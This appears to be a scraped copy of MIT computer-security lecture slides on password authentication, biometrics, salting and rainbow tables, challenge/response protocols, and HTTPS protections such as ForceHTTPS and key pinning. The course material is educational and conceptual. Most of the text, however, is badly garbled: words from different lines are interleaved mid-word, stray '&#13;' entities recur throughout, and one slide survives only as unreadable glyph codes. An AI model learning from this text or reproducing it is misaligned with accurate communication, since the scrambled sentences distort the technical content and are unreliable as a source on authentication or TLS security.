enot	&#13; lar
ll-knoge	&#13; enough	&#13; 
o distributions.	&#13; ewwn	&#13; s
edubs
	&#13; et."	&#13; 
usResilient
er	&#13; by	&#13; in-to
te-
rInter
ceptinal
ng	&#13; -
tO
hb
e	&#13; s
ue
sr
ev
ra
'sti
	&#13; io
nn
p:	&#13; "An	&#13; attack
(e.g.,	&#13; by	&#13; keylogging 	&#13; malware)	&#13; or	&#13; eau
vt
e	&#13; f
sr
do
rm	&#13; 
opin
pse
idr	&#13; 
ec
	&#13; a
ing	&#13; othn
en
	&#13; usot	&#13; 
eimp
r's	&#13; der
es
vo
in
cea
	&#13; te	&#13; a	&#13; 
c
attackeommu
rn
	&#13; can	&#13; alsication
o	&#13; betweenn	&#13; the	&#13; cleartext	&#13; 
CA)This	&#13; penaliz	&#13; defea
es	&#13; scht
e	&#13; TLS	&#13; 	&#13; pro
if	&#13; ve
itr
	&#13; 	&#13; 
is	&#13; an
ud
sed,	&#13; 	&#13; ver
pif
erhaier	&#13; (w
ps	&#13; e	&#13; 
ta
mehroussume
s	&#13; that	&#13; are	&#13; not	&#13; replay -resistagh	&#13; 
	&#13; t
thha
et
	&#13; 	&#13; the	&#13; 
be
resc
paus
oe	&#13; they	&#13; send	&#13; a	&#13; static	&#13; respont,	&#13; whether	&#13; 
This	&#13; bn
es
ne
e	&#13; c
fio
t	&#13; u
an
st
se
ur
meme
sa
	&#13; ts
hu
ar
te
	&#13; g	&#13; c
ea
nn
e	&#13; bense	&#13; or	&#13; becaus
thethe
r	&#13; a	&#13; f	&#13; 
al	&#13; c
-purracke
posd	&#13; wi
e	&#13; dew	&#13; oir	&#13; dy
bsn
ea
rmi
vatic	&#13; 
ons.	&#13; 
umapd
lwat
aa
rb
el
,e
	&#13; but	&#13; th	&#13; perso
at	&#13; hnal	&#13; 
arco
dmp
warut
ee
	&#13; drs
e	&#13; 
va
in
cd
e	&#13; 
smo
	&#13; deb
di
il
ce
ate	&#13; phevice
oness	&#13; 
	&#13; malike
y	&#13; s
	&#13; co
of
ntw
taar
in	&#13; e-
sche
me
 Passw	&#13; can	&#13; b
ords	&#13; faile	&#13; made	&#13; ma
	&#13; because	&#13; tlware-free." 	&#13; d	&#13; exclusively	&#13; to	&#13; the	&#13; 
o one,	&#13; you	&#13; can	&#13; use	&#13; ithey	&#13; are	&#13; static	&#13; tokens:	&#13; once	&#13; you 	&#13; have	&#13; 
Resilient(including-to
	&#13; b-
yP
	&#13; h
Di
Nsh
Si
	&#13; mang:	&#13; "An	&#13; unt
impern	&#13; il	&#13; it	&#13; expires	&#13; or	&#13; is	&#13; revoked.	&#13; 
later	&#13; be	&#13; used	&#13; to 	&#13;  si
op
nu
ala
at
tt
ia
ocker	&#13; who	&#13; s
te	&#13; thn
e)
	&#13; u	&#13; c
sa
en
rn
	&#13; to
ot
	&#13; 	&#13; 
tcimu
ho
el
	&#13; lelate
acc
tt
u	&#13; credents	&#13; a	&#13; valid	&#13; verifier	&#13; 
penalizes	&#13; schemes	&#13; allowing	&#13; phishers	&#13; to	&#13; get	&#13; victimsal	&#13; v
	&#13; te
or
	&#13; aifiial
ers	&#13; t
.	&#13; This	&#13; hat	&#13; can	&#13; 
lo
genuine	&#13; sites."ok
-
 alike	&#13; sites	&#13; 
	&#13; and	&#13; later	&#13; use	&#13; the	&#13; harvested 	&#13; credentials	&#13; againstuthenti
	&#13; tca
he	&#13; te	&#13; to	&#13; 
o Passwords	&#13; fail
th*N
io
rd-Trust
	&#13; partyed
	&#13; (o-Third
ther	&#13; th-P
ana:	&#13; phishing	&#13; at
r
	&#13; t
thy:
e	&#13; "
	&#13; prTh
oe
v	&#13; s
echtacks 	&#13; a e y o
r	&#13; andeme
	&#13; th	&#13; dr
oe	&#13; v
s	&#13; er 	&#13; c
e	&#13; vnot	&#13; rely	&#13; on	&#13; a	&#13; trmmon!	&#13; 
usted	&#13; 
thbe
eing	&#13; attac
	&#13; 
pr
 over'ske
	&#13; sd
ecur	&#13; or	&#13; o
ity	&#13; ortherwi
	&#13; prs
ivacy."e	&#13; beco
	&#13; ming	&#13; untrue
sr
ti
wfie
or
r)
t	&#13; wh
hy,	&#13; o
co	&#13; coul
mprd,	&#13; upon	&#13; 
omise	&#13; 
T
prh
ois
b	&#13; 
lpr
to	&#13; stoemsop
	&#13; pas	&#13; e
rewrt
soy	&#13; ma
would	&#13; bk
ee
cs
o	&#13; a
men	&#13; i
	&#13; mp
easo
ier
rta
r	&#13; in
f	&#13; t
we	&#13; point:
	&#13; could	&#13; a	&#13; lot	&#13; of
	&#13; just	&#13; tr	&#13; authentication
ust	&#13; one	&#13; party	&#13; 	&#13; 
o singltheire
	&#13; energy	&#13; on	&#13; t	&#13; points	&#13; of	&#13; failurds,	&#13; run	&#13; th
e	&#13; are	&#13; bade	&#13; password 	&#13; servers,	&#13; etc.	&#13; However,	&#13; 
*Resilient -to-Leaks-fromha
-Otht	&#13; point
er-Verifiers:!	&#13; ,	&#13; since	&#13; attackers	&#13; can	&#13; focus	&#13; all	&#13; of	&#13; 
could	&#13; possibly 	&#13; leak	&#13; can	&#13; help	&#13; an	&#13; attacker	&#13; imp	&#13; "Nothing	&#13; that	&#13; a	&#13; ver
ersonifier	&#13; 
anoprovidthe
err	&#13; ve
,	&#13; orri
	&#13; a	&#13; sfier
ucces.	&#13; This
s	&#13; pe
ful	&#13; attack	&#13; on	&#13; onenalizes 	&#13; scheme
	&#13; bacs	&#13; w
kh
-e
end,	&#13; endare	&#13; insa
it
de
e	&#13; t
rh
	&#13; fe
r	&#13; 
aus
uder
	&#13; a	&#13; to	&#13; 
t	&#13; one	&#13; 
acco
unts
 This	&#13; propert	&#13; at	&#13; other	&#13; sites." 	&#13; ngers	&#13; the	&#13; user's	&#13; 
y	&#13; is	&#13; rel
distcent
ribral
u	&#13; point
ted	&#13; a	&#13; of	&#13; fail
uthenture,	&#13; wated	&#13; to
ication:e'd	&#13; No
	&#13; h	&#13; l
oi-
kTrust
we
e	&#13; t
vo
e	&#13; ied
nt-
rThird
oduce-
dPart
	&#13; somey.	&#13; To	&#13; avoid
	&#13; notion	&#13; of	&#13; 	&#13; a	&#13; 
s
HTTPSystem	&#13; 
,	&#13; i
ands	&#13; on
	&#13; hly
o	&#13; a
w	&#13; a	&#13; bads	&#13; stron
	&#13; ceg	&#13; a
rs
ti	&#13; i
ft
is
cate	&#13; weaker,
s	&#13; d
t	&#13; lioe
	&#13; authornk?	&#13; [Ts	&#13; this	&#13; mean	&#13; that	&#13; the	&#13; 
ity	&#13; can	&#13; convince	&#13; a	&#13; hink	&#13; back	&#13; to	&#13; 
6</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>browser	&#13; to	&#13; acce
Audep
thends	&#13; pt	&#13; fake	&#13; certificates	&#13; 
ors	&#13; son	&#13; 
ay	&#13; t
the
ha	&#13; 
ts
	&#13; t
pr
ae
sn
sg
wth
o	&#13; of	&#13; the	&#13; leasfor	&#13; 
t	&#13; sea
crb
urit
e	&#13; ra
CA!ry
]	&#13; 
	&#13; sites.	&#13; Security	&#13; 
	&#13; passwords 	&#13; across	&#13; sites. 	&#13; rds	&#13; fail	&#13; because	&#13; people	&#13; often	&#13; reuse	&#13; 
B
per
 iome
son'stri
	&#13; physcs:	&#13; Le
ical	&#13; appearverage	&#13; the
How
o	&#13; 
 big	&#13; is	&#13; the	&#13; keyspaance	&#13; or	&#13; unique
	&#13; behavior	&#13; aspects	&#13; of	&#13; 
rince?.	&#13; a	&#13; 
o Fin
Irisg
	&#13; serp	&#13; 
o can:	&#13; ~1ts:	&#13; 
9~
.913.
	&#13; bits3	&#13; 
recog.b
 	&#13; its.	&#13; 
So,	&#13; bitsVoice	&#13; 
	&#13; of	&#13; entropy	&#13; n
arit
eion
	&#13; ro:	&#13; 
u~
gh11.
ly	&#13; 7	&#13; b
                        	&#13; 	&#13; 	&#13; 	&#13; 	&#13; theit
	&#13; ss.
Passwords        Biometricsa	&#13; 
me	&#13; as	&#13; passwords. 	&#13; 
 
    Easy-to-learn:      Yes              Yes 
    Infrequent errors:  Quasi-yes        No 
    Scalable for users: No               Yes 
    Easy recovery:      Yes              No     Nothing to carry:   Yes              Yes 
                             3.5 vs 3     
                         Passwords        Biometrics 
   Server-compatible:   Yes              No 
   Browser-compatible:  Yes              No    Accessible:          Yes              Quasi-yes 
(entering biometrics is error-prone)     
                             3 vs 0.5      
                        Passwords        Biometrics 
Res-to-Phys-Obs:        No               Yes 
Res-to-Trgtd-Imp:       Quasi-yes        No (e.g., 
replaying voice recording, lifting fingerprints from surfaces) 
Res-to-Thrtld-Guess:    No               Yes 
Res-to-UnThrtld-Guess:  No               No (key space isn't much bigger than that of passwords) 
Res-to-Internal-Obv:    No               No (captured 
biometric data can be replayed) Res-to-Phishing:        No               No 
No-trusted-3rd-Party:   Yes              Yes 
Res-Other-Ver-Leaks:    No               No (same 
biometrics are used by all verifiers) 
                            
	&#13; 1.5 vs 3 
7</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>o Pro
b
 
 lem:
Ta	&#13; 
bad
le	&#13; of	&#13; paversar
sswy	&#13; ca
ordn	&#13; b
-uild	&#13; "rainbow	&#13; tables".	&#13; 
 haEx
shespens
	&#13; i
afve
te	&#13; t
ro
war	&#13; comp
ds.uto
te-h
,	&#13; ba
ush
t	&#13; allo	&#13; map
wspi
	&#13; thng
es.
 T	&#13; 	&#13; 	&#13; 
attacker	&#13; to	&#13; efficiently	&#13; invert	&#13; 
o	&#13; maximi
Roughly:	&#13; 1a	&#13; rai
nbo
 w	&#13; tableze	&#13; co
	&#13; fst
o/
rb
	&#13; de
in
ctief
oit
-second	&#13; expensive	&#13; nar	&#13; tra
y	&#13; ode-
foff,	&#13; the	&#13; attac
hash	&#13; co
	&#13; mmon	&#13; paske
swr	&#13; o
ornly
ds	&#13; ne
.	&#13; ed	&#13; to	&#13; build 	&#13; 
 
 pasto	&#13; h
sa
worsh|
	&#13; -
c&gt;	&#13; 1M	&#13; seconds	&#13; =	&#13; 10	&#13; days 	&#13; 
Bette
o r	&#13; solution:	&#13; server	&#13; can	&#13; usdo
smmo
	&#13; in	&#13; any	&#13; pan	&#13; pws
e sssw.	&#13; Af
	&#13; pas woord	&#13; dbter	&#13; tha
.t
	&#13; ,	&#13; can	&#13; very	&#13; quickly	&#13; crack	&#13; common	&#13; 
o Input	&#13; sord	&#13; salts. 	&#13; 
o Where	&#13; dme
oes	&#13; a
	&#13; td
hd
ei
	&#13; sti
ao
ln
t	&#13; a
vl
a	&#13; r
lua
en
	&#13; d
coo
memn
	&#13; e
frs
os	&#13; 
m?int
	&#13; o
It	&#13; th
's	&#13; e
st	&#13; pas
ored	&#13; swo
on	&#13; r
td
he	&#13; 	&#13; has
serveh:	&#13; H
r	&#13; (salt,	&#13; pw). 	&#13; 
o Q:plaintext.	&#13; in	&#13; 
A:	&#13; 	&#13; Wh
They	&#13; i
	&#13; ats
t	&#13; th
ackis
e	&#13; be
r	&#13; ctte
annr	&#13; i
of
t	&#13; th
	&#13; use
e	&#13; ad
	&#13; a	&#13; sve
inr
gs
lar
e	&#13; ray	&#13; c
ina
bn
ow	&#13; comp
	&#13; tabr
lo
e	&#13; mi
to	&#13; s
checke	&#13; the	&#13; 
	&#13; s
for	&#13; alt	&#13; 
hatoo
sh?	&#13; 
	&#13; 
o ma
hash	&#13; vatches
lue!---t
	&#13; he	&#13; same	&#13; password	&#13; with	&#13; different	&#13; salts	&#13; will	&#13; have	&#13; a	&#13; different 	&#13; 
Bes
t	&#13; pr
 
 Cacti
hces:
Chooose
	&#13; ose	&#13; 	&#13; 	&#13; 
aa	&#13; 
	&#13; flo
ren
sg
h	&#13; r
	&#13; sa
an
ld
t	&#13; o
em	&#13; 
achsa
	&#13; tl
it
me.	&#13; 
	&#13; user	&#13; changes	&#13; password.	&#13; 
H
 
 ow
Bad	&#13; sh
	&#13; io
du
eld
a:	&#13; a
	&#13; s	&#13; c
el
ndien
	&#13; tht	&#13; t
er
	&#13; pasansmi
swot	&#13; a
r	&#13; 
dp
	&#13; ia
n	&#13; thssw
eo
	&#13; clerd	&#13; t
aro	&#13; 
 Slightly	&#13; better:	&#13; send	&#13; password	&#13; over.a	&#13; s
	&#13; erver? 	&#13; 
Dra
server	&#13; wba
(encrypck:	&#13; Con
tn
ion	&#13; ect
doesn'tion	&#13; may
	&#13; necessa	&#13; be	&#13; inter	&#13; an
cep	&#13; encrypt
ted	&#13; by	&#13; an	&#13; attaced	&#13; connect
ker	&#13; whion.
o	&#13; 
	&#13; pretends	&#13; to	&#13; be	&#13; the 	&#13; 
 thuse
er	&#13; c
.li
	&#13; ent!).	&#13; MITM	&#13; attacker	&#13; can	&#13; thenril
	&#13; uy
s	&#13; 
eme
	&#13; tha
en
	&#13; s	&#13; 
tt
oh
la
et
n	&#13; t
	&#13; h
pe
a	&#13; 
ss
se
wrv
oe
rr
d	&#13; h
	&#13; ta
os
	&#13; i	&#13; 
mpaut
eh
re
sn
ot
nic
aa
tt
ee
	&#13; thd	&#13; to
e	&#13; 	&#13; 
 Q:
A:	&#13; 	&#13; Wh
Doeat	&#13; i
sn'f
t	&#13; cli
	&#13; pre
ont	&#13; s
videe
	&#13; nd
uss
	&#13; w	&#13; th
ite
h	&#13; h
	&#13; aa
nsh	&#13; 
y	&#13; eof	&#13; 
xtrthe
a	&#13; power	&#13; passwor
,	&#13; since	&#13; the	&#13; hasd	&#13; instead	&#13; of
h	&#13; can	&#13; s	&#13; the	&#13; raw	&#13; password? 	&#13; 
 by	&#13; thtill	&#13; be 	&#13; replayed	&#13; 
aboEnc
utrye
p	&#13; attac
tion	&#13; ke
anr
d.
	&#13; 	&#13; 
	&#13; what	&#13; securha
itysh
	&#13; pring
o	&#13; 
pedo
r	&#13; 
tino
et
s	&#13; 
	&#13; yautomatically	&#13; add	&#13; security ---you	&#13; need	&#13; to	&#13; think	&#13; 
 encrypt
Better	&#13; idion
ea:	&#13; and
	&#13; Challe	&#13; has
ngehing	&#13; can	&#13; ach
/responseieou	&#13; want	&#13; to	&#13; ach
       Client             Server	&#13; prve
o	&#13; thieve,	&#13; and	&#13; specific	&#13; ways	&#13; that	&#13; 
	&#13; tocoose
l.	&#13; go
	&#13; als.	&#13; 
 
            Hi, I'm Alice. 
           ----------------&gt;  
              Challenge C 
           &lt;----------------  
            H(C || password) 
2</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-6-capabilities/</video_url>
          <video_title>Lecture 6: Capabilities</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>SSL and HTTPS (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec14/</lecture_pdf_url>
      <lectureno>14</lectureno>
      <slides>
        <slide>
          <slideno>5</slideno>
          <text>/g24/g31/g28/g1/g27/g42/g42/g38/g35/g29/g27/g46/g35/g41/g40/g1/g30/g31/g48/g31/g38/g41/g42/g31/g44/g1/g29/g41/g47/g38/g30/g1/g39/g27/g37/g31/g1/g27/g1/g39/g35/g45/g46/g27/g37/g31/g54/g1/g32/g41/g44/g33/g31/g46/g45/g1/g46/g34/g31/g1/g20/g31/g29/g47/g44/g31/g1/g32/g38/g27/g33/g57/g1
/g1/g22/g45/g31/g44/g1/g48/g35/g45/g35/g46/g45/g1/g34/g46/g46/g42/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g60/g1/g35/g40/g45/g46/g31/g27/g30/g1/g41/g32/g1/g34/g46/g46/g42/g45/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g60/g54/g1/g38/g31/g27/g37/g45/g1/g29/g41/g41/g37/g35/g31/g57/g1
/g20/g47/g42/g42/g41/g45/g31/g1/g46/g34/g31/g1/g47/g45/g31/g44/g1/g41/g40/g38/g51/g1/g48/g35/g45/g35/g46/g45/g1
 

 /g6/g48/g31/g40/g1/g35/g32/g1/g47/g45/g31/g44/g1/g40/g31/g48/g31/g44/g1/g48/g35/g45/g35/g46/g45/g1/g27/g40/g51/g1/g9/g21/g21/g17/g1/g45/g35/g46/g31/g54/g1/g27/g42/g42/g38/g35/g29/g27/g46/g35/g41/g40/g1/g29/g41/g30/g31/g1/g39/g35/g33/g34/g46/g1/g28/g31/g1/g28/g47/g33/g33/g51/g57/g1
o /g20/g41/g39/g31/g1/g45/g35/g46/g31/g45/g1/g45/g31/g44/g48/g31/g1/g38/g41/g33/g35/g40/g1/g32/g41/g44/g39/g45/g1/g41/g48/g31/g44/g1/g9/g21/g21/g17/g20/g1/g27/g40/g30/g1/g45/g31/g44/g48/g31/g1/g41/g46/g34/g31/g44/g1/g29/g41/g40/g46/g31/g40/g46/g1/g41/g48/g31/g44/g1
/g9/g21/g21/g17/g57/g1/g2/g30/g48/g31/g44/g45/g27/g44/g51/g1/g29/g27/g40/g1/g29/g27/g47/g45/g31/g1/g27/g40/g41/g46/g34/g31/g44/g1/g9/g34/g46/g46/g42/g45/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g60
/g21/g21/g17/g1/g45/g35/g46/g31/g1/g46/g41/g1/g44/g31/g30/g35/g44/g31/g29/g46/g1/g46/g41/g1/g57/g1/g1/g24/g34/g51/g1/g35/g45/g1/g46/g34/g35/g45/g1/g45/g46/g35/g38/g38/g1/g27/g1/g42/g44/g41/g28/g38/g31/g39/g59/g1
/g34/g46/g46/g42/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g60/g57/g1
o
 /g3/g31/g1/g29/g27/g44/g31/g32/g47/g38/g1/g49/g34/g31/g40/g1/g45/g31/g44/g48/g35/g40/g33/g1/g41/g48/g31/g44/g1/g28 /g41/g46/g34/g1/g9/g21/g21/g17/g1/g27/g40/g30/g1/g9/g21/g21/g17/g20/g57 /g1
/square4 /g6/g57/g33/g57/g54/g1/g8/g41/g41/g33/g38/g31/g68/g45 /g1/g38/g41/g33/g35/g40/g1/g45/g31/g44/g48/g35/g29/g31/g1/g29/g44
/g31/g27/g46/g31/g45/g1/g40/g31/g49/g1/g29/g41/g41/g37/g35/g31/g45 /g1/g41/g40/g1/g44/g31/g43/g47/g31/g45/g46/g57/g1
/square4 /g13/g41/g33/g35/g40/g1/g45/g31/g44/g48/g35/g29/g31/g1 /g34/g27/g45/g1/g35/g46/g45/g1/g41/g49/g40/g1/g61/g20/g31/g29/g47/g44/g31/g62/g1/g29/g41/g41/g37/g35/g31/g57/g1
/square4 /g4/g27/g40/g1/g44/g31/g43/g47/g31/g45/g46/g1/g38/g41/g33/g35/g40/g1/g46/g41/g1/g27/g1/g8/g41/g41/g33/g38/g31/g1/g45/g35/g46/g31/g1/g28/g51/g1/g38/g41/g27/g30/g35/g40/g33/g1/g38/g41/g33/g35/g40/g68/g45/g1/g9/g21/g21/g17/g20/g1/g22/g19/g13/g57/g1
/square4 /g22/g45/g31/g30/g1/g46/g41/g1/g28/g31/g1/g27/g28 /g38/g31/g1/g46/g41/g1/g27/g38/g45/g41/g1/g38/g41/g33/g35/g40/g1/g48/g35/g27/g1/g29/g41/g41/g37/g35/g31/g1/g46/g34/g27/g46/g1/g49/g27/g45/g40/g68/g46/g1/g20/g31/g29/g47/g44/g31/g57 /g1
/square4 /g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g45/g41/g38/g48/g31/g45/g1/g42/g44/g41/g28/g38/g31/g39/g1/g28/g51/g1/g44/g31/g30/g35/g44/g31/g29/g46/g35/g40/g33/g1/g9/g21/g21/g17/g1/g22/g19/g13/g45/g1/g46/g41/g1/g9/g21/g21/g17/g20/g57/g1
/square4 /g19/g31/g32/g56/g1/g34/g46/g46/g42/g56/g60/g60/g28/g38/g41/g33/g57/g35/g29/g35/g44/g57/g41/g44/g33/g60/g74/g72/g72/g80/g60/g72/g74/g60/g45/g35/g30/g31/g36/g27/g29/g37/g35/g40/g33/g58/g32/g41/g44/g29/g31/g30/g58/g45/g35/g30/g31/g36/g27/g29/g37/g35/g40/g33/g58/g27/g40/g30/g57/g34/g46/g39/g38/g1
/g1
/g1/g1/g4
/g41/g41/g37/g35/g31/g1/g35/g40/g46/g31/g33/g44/g35/g46/g51/g1/g42/g44/g41/g28/g38/g31/g39/g45/g57/g1
 
/g15/g41/g1/g49/g27/g51/g1/g46/g41/g1/g30/g31/g46/g31/g44/g39/g35/g40/g31/g1/g49/g34/g41/g1/g45/g31/g46/g1/g46/g34/g31/g1/g29/g41/g41/g37/g35/g31/g57/g1 /g15/g41/g40/g58/g20/g31/g29/g47/g44/g31/g1/g29/g41/g41/g37/g35/g31/g45/g1/g45/g31/g46/g1/g41/g40/g1/g34/g46/g46/g42/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g1/g45/g46/g35/g38/g38/g1/g45/g31/g40/g46/g1/g46/g41/g1/g34/g46/g46/g42/g45/g56/g60/g60/g28/g27/g40/g37/g57/g29/g41/g39/g57/g1
/g1
/g39/g1/g33/g4/g34/g31/g1/g11/g25/g15/g24/g25/g1/g14/g18/g24/g15/g13/g26/g20/g30/g1/g15/g21/g26/g15/g24/g18/g21/g16/g1/g13/g24/g15/g14/g15/g21/g26/g18/g12/g20/g25/g31/g1
 /g17/g34/g35/g45/g34/g35/g40/g33/g1/g27/g46/g46/g27/g29/g37/g45/g57/g1
 /g22/g45/g31/g44/g45/g1/g30/g41/g40/g68/g46/g1/g29/g34/g31/g29/g37/g1/g32/g41/g44/g1/g38/g41/g29/g37/g1/g35/g29/g41/g40/g57/g1
 /g22/g45/g31/g44/g45/g1/g30/g41/g40/g68/g46/g1/g29/g27/g44/g31/g32/g47/g38/g38/g51/g1/g29/g34/g31/g29/g37/g1/g30/g41/g39/g27/g35/g40/g1/g40/g27/g39/g31/g54/g1/g30/g41/g40/g68/g46/g1/g37/g40/g41/g49/g1/g49/g34/g27/g46/g1/g46/g41/g1/g38/g41/g41/g37/g1/g32/g41/g44/g57/g1
o /g6/g57/g33/g57/g54/g1/g46/g51/g42/g41/g1/g30/g41/g39/g27/g35/g40/g45/g1/g61/g42/g27/g51/g42/g27/g73/g57/g29/g41/g39/g62/g54/g1/g47/g40/g35/g29/g41/g30/g31/g1
 /g24/g31/g28/g1/g30/g31/g48/g31/g38/g41/g42/g31/g44/g45/g1/g42/g47/g46/g1/g38/g41/g33/g35/g40/g1/g32/g41/g44/g39/g45/g1/g41/g40/g1/g9/g21/g21/g17/g1/g42/g27/g33/g31/g45/g1/g61/g46/g27/g44/g33/g31/g46/g1/g38/g41/g33/g35/g40/g1/g45/g29/g44/g35/g42/g46/g1/g35/g45/g1/g9/g21/g21/g17/g20/g62/g57/g1
o /g2/g30/g48/g31/g44/g45/g27/g44/g51/g1/g29/g27/g40/g1/g39/g41/g30/g35/g32/g51/g1/g38/g41/g33/g35/g40/g1/g32/g41/g44/g39/g1/g46/g41/g1/g42/g41/g35/g40/g46/g1/g46/g41/g1/g27/g40/g41/g46/g34/g31/g44/g1/g22/g19/g13/g57/g1
o /g13/g41/g33/g35/g40/g1/g32/g41/g44/g39/g1/g40/g41/g46/g1/g42/g44/g41/g46/g31/g29/g46/g31/g30/g1/g32/g44/g41/g39/g1/g46/g27/g39/g42/g31/g44/g35/g40/g33/g54/g1/g47/g45/g31/g44/g1/g34/g27/g45/g1/g40/g41/g1/g49/g27/g51/g1/g46/g41/g1/g46/g31/g38/g38/g57/g1
/g1
/g9/g41/g49/g1/g30/g41/g31/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g61/g46/g34/g35/g45/g1/g42/g27/g42/g31/g44/g62/g1/g27/g30/g30/g44/g31/g45/g45/g1/g45/g41/g39/g31/g1/g41/g32/g1/g46/g34/g31/g45/g31/g1/g42/g44/g41/g28/g38/g31/g39/g45/g59/g1
 /g20/g31/g44/g48/g31/g44/g1/g29/g27/g40/g1/g45/g31/g46/g1/g27/g1/g32/g38/g27/g33/g1/g32/g41/g44/g1/g35/g46/g45/g1/g41/g49/g40/g1/g34/g41/g45/g46/g40/g27/g39/g31/g1/g35/g40/g1/g46/g34/g31/g1/g47/g45/g31/g44/g68/g45/g1/g28/g44/g41/g49/g45/g31/g44/g57/g1
o /g14/g27/g37/g31/g45/g1/g20/g20/g13/g60/g21/g13/g20/g1/g29/g31/g44/g46/g35/g32/g35/g29/g27/g46/g31/g1/g39/g35/g45/g29/g41/g40/g32/g35/g33/g47/g44/g27/g46/g35/g41/g40/g45/g1/g35/g40/g46/g41/g1/g27/g1/g32/g27/g46/g27/g38/g1/g31/g44/g44/g41/g44/g57/g1
o /g19/g31/g30/g35/g44/g31/g29/g46/g45/g1/g9/g21/g21/g17/g1/g44/g31/g43/g47/g31/g45/g46/g45/g1/g46/g41/g1/g9/g21/g21/g17/g20/g57/g1
o /g17/g44/g41/g34/g35/g28/g35/g46/g45/g1/g40/g41/g40/g58/g9/g21/g21/g17/g20/g1/g31/g39/g28/g31/g30/g30/g35/g40/g33/g1/g61/g83/g1/g42/g31/g44/g32/g41/g44/g39/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g32/g41/g44/g1/g46/g34/g31/g39/g62/g57/g1
/g1
/g24/g34/g27/g46/g1/g42/g44/g41/g28/g38/g31/g39/g45/g1/g30/g41/g31/g45/g1/g7/g41/g44/g29/g31/g9/g21/g21/g17/g20/g1/g45/g41/g38/g48/g31/g59/g1
 /g14/g41/g45/g46/g38/g51/g1/g74/g54/g1/g75/g54/g1/g27/g40/g30/g1/g46/g41/g1/g45/g41/g39/g31/g1/g31/g50/g46/g31/g40/g46/g1/g76/g57/g1
o /g22/g45/g31/g44/g45/g1/g27/g29/g29/g31/g42/g46 /g35/g40/g33/g1/g35/g40/g48/g27/g38/g35/g30/g1/g29/g31/g44/g46/g35/g32/g35/g29/g27/g46/g31/g45/g57/g1
o /g5/g31/g48/g31/g38/g41/g42/g31/g44/g1/g39/g35/g45/g46/g27/g37/g31/g45/g56/g1/g31/g39/g28/g31/g30/g30/g35/g40/g33/g1/g35/g40/g45/g31/g29/g47/g44/g31/g1/g29/g41/g40/g46/g31/g40/g46/g57/g1
o /g5/g31/g48/g31/g38/g41/g42/g31/g44/g1/g39/g35/g45/g46/g27/g37/g31/g45/g56/g1/g32/g41/g44/g33/g31/g46/g46/g35/g40/g33/g1/g46/g41/g1/g32/g38/g27/g33/g1/g29/g41/g41/g37/g35/g31/g1/g27/g45/g1/g20/g31/g29/g47/g44/g31/g57/g1
o /g2/g30/g48/g31/g44/g45/g27/g44/g51/g1/g35/g40/g36/g31/g29/g46/g35/g40/g33/g1/g29/g41/g41/g37/g35/g31/g45/g1/g48/g35/g27/g1/g9/g21/g21/g17/g57/g1
/g1
/g10/g45/g1/g46/g34/g35/g45/g1/g44/g31/g27/g38/g38/g51/g1/g40/g31/g29/g31/g45 /g45/g27/g44/g51/g59/g1/g4/g27/g40/g1/g49/g31/g1/g36/g47/g45/g46/g1/g41/g40/g38/g51/g1/g47/g45/g31/g1/g9/g21/g21/g17/g20/g54/g1/g45/g31/g46/g1/g20/g31/g29/g47/g44 /g31/g1/g29/g41/g41/g37/g35/g31/g45/g54/g1/g31/g46/g29/g59/g1
 /g22/g45/g31/g44/g45/g1/g29/g27/g40/g1/g45/g46/g35/g38/g38/g1/g29/g38 /g35/g29/g37/g58/g46/g34/g44/g41/g47/g33/g34/g1/g31/g44/g44/g41/g44/g45/g54/g1/g45/g41/g1/g35/g46/g1/g45 /g46/g35/g38/g38/g1/g34/g31/g38/g42/g45/g1/g32/g41/g44/g1/g71/g74/g57/g1
6</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>o 
o Problems:
  Not	&#13; 
 	&#13; widely	&#13; deployed. 	&#13; 
Key
o	&#13; pi
 nning.	&#13; Only	&#13; possible	&#13; to	&#13; staple	&#13; one	&#13; OCSP	&#13; response. 	&#13; 
o o Only	&#13; acce
Remove	&#13; reliance	&#13; on	&#13; least	&#13; secure	&#13; Cpt	&#13; certificates	&#13; signed	&#13; by	&#13; per -site	&#13; whitelist	&#13; of	&#13; CAs.	&#13; 
o o Cu
Diginotar	&#13; compromise	&#13; caught	&#13; in	&#13; 2011	&#13; because	&#13; of	&#13; key	&#13; pinning.	&#13; rrently	&#13; a	&#13; hard-coded	&#13; list	&#13; of	&#13; sites	&#13; in	&#13; CA	&#13; (#2).	&#13; 
hrome.	&#13; 
Plans	&#13; to	&#13; add	&#13; mechanism	&#13; for	&#13; sites	&#13; to	&#13; advertise	&#13; pins.	&#13; 
 
 
o 	&#13; Ref:	&#13; http://tools.ietf.org/html/draft-ietf-websec-key-pinn ing-21	&#13; 
Same	&#13; bootstrapping	&#13; difficulty	&#13; as	&#13; in	&#13; ForceH
	&#13; 
OthTTPS.	&#13; 
 http://www.imperialviolet.org/2012/07/19/hope9talk.html	&#13; er	&#13; references: 	&#13; 
	&#13; Effectively	&#13; a	&#13; short-lived	&#13; certificate. 	&#13; 
9
 Ref:	&#13; http://tack.io/</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>Optionally	&#13; provides	&#13; an	&#13; interface	&#13; for	&#13; users	&#13; to	&#13; manually	&#13; enable	&#13; it.	&#13; 
Implemented	&#13; in	&#13; C
Boo
ots
 trapping	&#13; largehrome,	&#13; Firefox,	&#13; and	&#13; Opera.	&#13; 
 Chrome	&#13; has	&#13; a	&#13; hardly	&#13; uns
-o
coded	&#13; llved.	&#13; 
IE9,	&#13; Firefox	&#13; 23,	&#13; and	&#13; C
